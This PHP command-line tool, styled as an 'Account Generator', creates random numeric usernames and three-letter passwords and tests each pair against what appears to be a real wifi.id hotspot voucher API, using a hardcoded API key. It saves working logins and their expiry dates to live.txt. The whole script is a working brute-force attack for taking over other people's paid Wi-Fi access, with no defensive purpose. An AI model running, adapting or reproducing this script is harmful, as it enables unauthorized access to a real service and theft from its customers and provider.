<?php
error_reporting(0);
// Color
$blue="\033[1;34m";
$cyan="\033[1;36m";
$okegreen="\033[92m";
$lightgreen="\033[1;32m";
$white="\033[1;37m";
$purple="\033[1;35m";
$red="\033[1;31m";
$yellow="\033[1;33m";

$list = "list.txt";

function user($total){
	$abc = "1234567890";
	$word = "";
	for ($i=0; $i < $total ; $i++) { 
		$word .=$abc{rand(0,strlen($abc)-1)};
	}
	return $word;
}

function pass($total){
	$abc = "abcdefghijklmnopqrstuvwxyz";
	$word = "";
	for ($i=0; $i < $total ; $i++) { 
		$word .=$abc{rand(0,strlen($abc)-1)};
	}
	return $word;
}

@system('clear');
print "\n";
print "$cyan      .===. (                                \n";
print "$cyan      |   |  )  $okegreen   _      ___ ____   _    __ \n";
print "$cyan      |   | (   $okegreen  | | /| / (_) _(_) (_)__/ / \n";
print "$cyan      |   | )   $okegreen  | |/ |/ / / _/ / / / _  /  \n";
print "$cyan      |   \*/   $okegreen  |__/|__/_/_//_(_)_/\_,_/   \n";
print "$cyan    ,'    //.   $yellow      Account Generator    \n";
print "$cyan   :~~~~~//~~;                               \n";
print "$cyan    `.  // .'   $white https://github.com/Altify-Developing \n";
print "$cyan    `-------'                                \n\n";

$awal = array("","9813","9812","9811","9853","9852");
echo "$yellow ??$white Total : ";
$total = trim(fgets(STDIN));

echo "$yellow **$white Creating account list ... \n";
for ($i=0; $i < $total; $i++){
    $length = rand(13,15);
    $randawal = array_rand($awal,3);
    $base = $awal[$randawal[1]];
    $user = $base.user(str_replace("-", "", strlen($base) -$length));
    $pass = pass(3);
    fwrite(fopen($list, "a"), "$user|$pass \n");
}

$file = file('list.txt');
echo "$yellow **$white Checking list ... \n\n";
foreach ($file as $akon => $data) {
	$split = explode("|", $data);
	$user = trim($split[0]);
	$pass = trim($split[1]);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://caramel.wifi.id/api/ott/v2');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"password\":\"$pass\",\"username\":\"$user\"}");
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
    $headers = array();
    $headers[] = 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $headers[] = 'Accept-Language: en-US,en;q=0.5';
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    $headers[] = 'X-Api-Key: 8d446f02-ef8d-47b2-9663-dbe75b016fb9';
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'Cache-Control: max-age=0, no-cache';
    $headers[] = 'Pragma: no-cache';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $result = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($result);
    $act = $json->act;
	$exp = $json->expire;
	// $amount = $json->amount;
	$duration = $json->duration;
	// $hour = $json->hour;
	if ($act == "INVALID") {
        echo "$red //$white DIE!$yellow ->$white $user|$pass \n";
        fwrite(fopen("die.txt", "a"), "$user|$pass \n");
	}else{
		echo "$okegreen //$white LIVE until $exp$yellow ->$white $user|$pass \n";
		fwrite(fopen("live.txt", "a"), "username: $user, password: $pass, Masa aktif $duration hari, hingga $exp WIB. CS:147 \n");
	}
	sleep(1);
}
echo "\n";

?>
